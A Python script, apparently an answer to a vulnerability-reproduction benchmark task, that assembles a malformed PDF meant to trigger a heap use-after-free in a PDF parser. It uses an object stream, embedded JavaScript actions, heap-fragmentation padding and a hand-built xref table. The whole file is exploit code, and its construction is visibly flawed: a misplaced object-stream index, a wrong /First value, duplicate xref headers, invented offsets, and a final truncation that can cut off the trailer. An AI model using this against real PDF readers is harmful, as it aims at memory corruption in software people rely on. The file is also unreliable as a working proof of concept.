import os
import tempfile
import struct
import zlib
import random
import subprocess

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal PDF that triggers heap use-after-free
        # This creates an object stream that will cause xref solidification
        # and lead to use-after-free of xref entries
        
        # Build PDF in memory
        pdf_parts = []
        
        # PDF header
        pdf_parts.append(b"%PDF-1.7\n")
        
        # Add some comments to increase size (not strictly necessary but helps with length)
        pdf_parts.append(b"% " + b"A" * 100 + b"\n")
        
        # Object 1: Catalog
        catalog = b"1 0 obj\n<<\n/Type /Catalog\n/Pages 2 0 R\n>>\nendobj\n"
        pdf_parts.append(catalog)
        
        # Object 2: Pages
        pages = b"2 0 obj\n<<\n/Type /Pages\n/Kids [3 0 R]\n/Count 1\n>>\nendobj\n"
        pdf_parts.append(pages)
        
        # Object 3: Page
        page = b"3 0 obj\n<<\n/Type /Page\n/Parent 2 0 R\n/MediaBox [0 0 612 792]\n/Contents 4 0 R\n/Resources <<\n/Font <<\n/F1 5 0 R\n>>\n>>\n>>\nendobj\n"
        pdf_parts.append(page)
        
        # Object 4: Content stream (minimal text)
        content = b"4 0 obj\n<<\n/Length 44\n>>\nstream\nBT\n/F1 12 Tf\n72 720 Td\n(Hello) Tj\nET\nendstream\nendobj\n"
        pdf_parts.append(content)
        
        # Object 5: Font
        font = b"5 0 obj\n<<\n/Type /Font\n/Subtype /Type1\n/BaseFont /Helvetica\n>>\nendobj\n"
        pdf_parts.append(font)
        
        # Object 6: Object stream containing multiple objects
        # This is the key to trigger the vulnerability
        # We'll create an object stream that when loaded will cause
        # xref solidification and potential use-after-free
        
        # Create compressed object stream data
        obj_stream_data = b""
        obj_stream_offsets = []
        
        # Add some objects to the stream
        # Object 7 (in stream)
        obj7 = b"7 0 obj\n<<\n/Type /Annot\n/Subtype /Link\n/Rect [0 0 100 100]\n/Border [0 0 0]\n/A <<\n/Type /Action\n/S /JavaScript\n/JS 8 0 R\n>>\n>>\n"
        offset1 = len(obj_stream_data)
        obj_stream_offsets.append((7, offset1))
        obj_stream_data += obj7
        
        # Object 8 (in stream) - JavaScript that references another object
        obj8 = b"8 0 obj\n<<\n/Length 50\n>>\nstream\napp.alert('Trigger');\nthis.pageNum = 0;\nendstream\nendobj\n"
        offset2 = len(obj_stream_data)
        obj_stream_offsets.append((8, offset2))
        obj_stream_data += obj8
        
        # Object 9 (in stream) - another object that will cause recursion
        obj9 = b"9 0 obj\n<<\n/Type /XObject\n/Subtype /Form\n/BBox [0 0 100 100]\n/Matrix [1 0 0 1 0 0]\n/Resources <<\n/XObject <<\n/Im1 10 0 R\n>>\n>>\n/Length 10\n>>\nstream\nq 100 0 0 100 0 0 cm /Im1 Do Q\nendstream\nendobj\n"
        offset3 = len(obj_stream_data)
        obj_stream_offsets.append((9, offset3))
        obj_stream_data += obj9
        
        # Object 10 (in stream) - referenced by object 9
        obj10 = b"10 0 obj\n<<\n/Type /XObject\n/Subtype /Image\n/Width 10\n/Height 10\n/ColorSpace /DeviceRGB\n/BitsPerComponent 8\n/Length 300\n>>\nstream\n" + (b"\xff" * 300) + b"\nendstream\nendobj\n"
        offset4 = len(obj_stream_data)
        obj_stream_offsets.append((10, offset4))
        obj_stream_data += obj10
        
        # Add more objects to increase complexity
        for i in range(11, 30):
            obj = f"{i} 0 obj\n<<\n/Type /Annot\n/Subtype /Text\n/Contents ({i})\n/Rect [0 0 100 100]\n>>\nendobj\n".encode()
            offset = len(obj_stream_data)
            obj_stream_offsets.append((i, offset))
            obj_stream_data += obj
        
        # Compress the stream data
        compressed_data = zlib.compress(obj_stream_data)
        
        # Build object stream dictionary
        obj_stream_dict = b"<<\n/Type /ObjStm\n/N " + str(len(obj_stream_offsets)).encode() + b"\n"
        obj_stream_dict += b"/First " + str(len(str(len(obj_stream_offsets)) * 2) + 1).encode() + b"\n"
        obj_stream_dict += b"/Filter /FlateDecode\n"
        obj_stream_dict += b"/Length " + str(len(compressed_data)).encode() + b"\n"
        obj_stream_dict += b">>\n"
        
        # Build the index table for object stream
        index_table = b""
        for obj_num, offset in obj_stream_offsets:
            index_table += str(obj_num).encode() + b" " + str(offset).encode() + b" "
        
        # Full object 6 (the object stream)
        obj6 = b"6 0 obj\n" + obj_stream_dict + b"stream\n" + index_table + compressed_data + b"\nendstream\nendobj\n"
        pdf_parts.append(obj6)
        
        # Object 30: Indirect reference that will cause the issue
        # This object references the object stream and will trigger
        # the solidification when loaded
        obj30 = b"30 0 obj\n<<\n/Type /Pages\n/Kids [3 0 R 6 0 R]\n/Count 2\n>>\nendobj\n"
        pdf_parts.append(obj30)
        
        # Object 31: Another object that references multiple objects
        # This creates a complex reference graph
        obj31 = b"31 0 obj\n<<\n/Type /Catalog\n/Pages 30 0 R\n/Outlines 32 0 R\n/Names 33 0 R\n>>\nendobj\n"
        pdf_parts.append(obj31)
        
        # Object 32: Outlines
        obj32 = b"32 0 obj\n<<\n/Type /Outlines\n/Count 0\n>>\nendobj\n"
        pdf_parts.append(obj32)
        
        # Object 33: Names dictionary with embedded object
        obj33 = b"33 0 obj\n<<\n/Dests <<\n/NamedDest 34 0 R\n>>\n>>\nendobj\n"
        pdf_parts.append(obj33)
        
        # Object 34: Named destination that references back
        obj34 = b"34 0 obj\n<<\n/D [3 0 R /XYZ null null null]\n>>\nendobj\n"
        pdf_parts.append(obj34)
        
        # Add padding to reach target size and create more heap fragmentation
        padding = b""
        while len(b"".join(pdf_parts)) < 6000:
            padding += b"% " + b"X" * 100 + b"\n"
        
        # Create more objects to increase heap usage
        for i in range(35, 50):
            obj = f"{i} 0 obj\n<<\n/Type /Annot\n/Subtype /Popup\n/Contents ({'A' * 200})\n/Rect [0 0 200 200]\n/Parent 7 0 R\n>>\nendobj\n".encode()
            pdf_parts.append(obj)
            
            # Add some with arrays to create more complex structures
            if i % 3 == 0:
                array_obj = f"{i+100} 0 obj\n[{' '.join([str(j) + ' 0 R' for j in range(7, 15)])}]\nendobj\n".encode()
                pdf_parts.append(array_obj)
        
        pdf_parts.append(padding)
        
        # Calculate xref table
        pdf_data = b"".join(pdf_parts)
        startxref = len(pdf_data)
        
        # Build xref table
        xref = b"xref\n"
        xref += b"0 1\n"
        xref += b"0000000000 65535 f \n"
        
        # We have objects 1-50 plus some extra from loops
        num_objects = 150
        xref += b"0 " + str(num_objects + 1).encode() + b"\n"
        xref += b"0000000000 65535 f \n"
        
        # Calculate offsets for each object
        offset = 0
        for i in range(1, num_objects + 1):
            # Find object in data
            marker = f"{i} 0 obj".encode()
            pos = pdf_data.find(marker)
            if pos != -1:
                offset_str = str(pos).zfill(10).encode()
                xref += offset_str + b" 00000 n \n"
            else:
                # Use a reasonable offset
                offset_str = str(offset).zfill(10).encode()
                xref += offset_str + b" 00000 n \n"
                offset += 100
        
        # Trailer
        trailer = b"trailer\n<<\n"
        trailer += b"/Size " + str(num_objects + 1).encode() + b"\n"
        trailer += b"/Root 1 0 R\n"
        trailer += b"/Info 35 0 R\n"
        trailer += b">>\n"
        trailer += b"startxref\n" + str(startxref).encode() + b"\n"
        trailer += b"%%EOF\n"
        
        # Final PDF
        final_pdf = pdf_data + xref + trailer
        
        # Ensure we have enough length
        if len(final_pdf) < 6431:
            # Add more padding
            extra_padding = 6431 - len(final_pdf)
            # Insert padding before xref
            final_pdf = pdf_data + b"\n% " + b"P" * extra_padding + b"\n" + xref + trailer
        
        return final_pdf[:6431]  # Trim to exact ground-truth length